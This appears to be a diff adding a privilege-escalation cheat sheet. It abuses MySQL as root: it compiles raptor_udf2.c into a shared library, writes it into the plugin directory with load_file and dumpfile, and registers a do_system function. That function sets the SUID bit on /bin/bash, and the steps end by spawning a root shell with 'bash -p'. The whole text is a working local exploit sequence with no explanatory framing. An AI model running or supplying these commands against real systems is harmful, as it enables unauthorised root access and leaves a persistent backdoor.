@@ -1,0 +1,24 @@
+gcc -g -c raptor_udf2.c
+
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+mysql -u root -p
+
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+
+
+#if there is an error, copy file manually (cp /tmp/raptor_udf2.so /usr/lib/mysql/plugin/raptor_udf2.so && cp /tmp/raptor_udf2.so /usr/lib/raptor_udf2.so)
+
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> select * from mysql.func;
+ * +-----------+-----+----------------+----------+
+ * | name      | ret | dl             | type     |
+ * +-----------+-----+----------------+----------+
+ * | do_system |   2 | raptor_udf2.so | function |
+ * +-----------+-----+----------------+----------+
+mysql> select do_system('chmod u+s /bin/bash; chmod g+s /bin/bash');
+mysql>\! sh
+bash -p
